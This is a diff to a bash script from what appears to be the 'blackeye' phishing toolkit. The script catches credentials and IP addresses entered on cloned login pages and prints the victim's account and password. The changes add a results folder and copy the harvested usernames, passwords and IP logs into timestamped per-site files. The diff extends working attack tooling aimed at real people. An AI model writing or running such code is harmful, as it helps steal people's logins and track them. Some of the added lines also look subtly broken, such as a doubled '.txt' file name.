@@ -9,6 +9,7 @@ W='\033[1;37m'
 # TrapControl
 trap 'printf "\n";stop;exit 1' 2
 
+
 # Ensure system knows where blackeye directory was installed.
 if [[ ! -f '~/.local/.be_dir' ]]; then
   LDIR=$(pwd)
@@ -34,6 +35,11 @@ dependencies() {
   command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
   command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
 }
+
+# Create results directory
+if [[ ! -d 'results' ]]; then
+  mkdir results
+fi
 
 # Option Menu
 menu(){
@@ -353,6 +359,11 @@ catch_cred(){
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
   cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+  if [[ ! -d 'results/$server' ]]; then
+    mkdir results/$server
+  fi
+  TIME=$(date +%T)
+  cp sites/$server/saved.usernames.txt -t results/$server/${TIME}.usernames.txt
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
   killall -2 php > /dev/null 2>&1
   killall -2 ngrok > /dev/null 2>&1
@@ -383,6 +394,11 @@ catch_ip(){
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
   cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
+  if [[ ! -d 'results/$server' ]]; then
+    mkdir results/$server
+  fi
+  TIME=$(date +%T)
+  cp sites/$server/saved.ip.txt.txt -t results/$server/${TIME}.ip.txt
 
 
   if [[ -e iptracker.log ]]; then
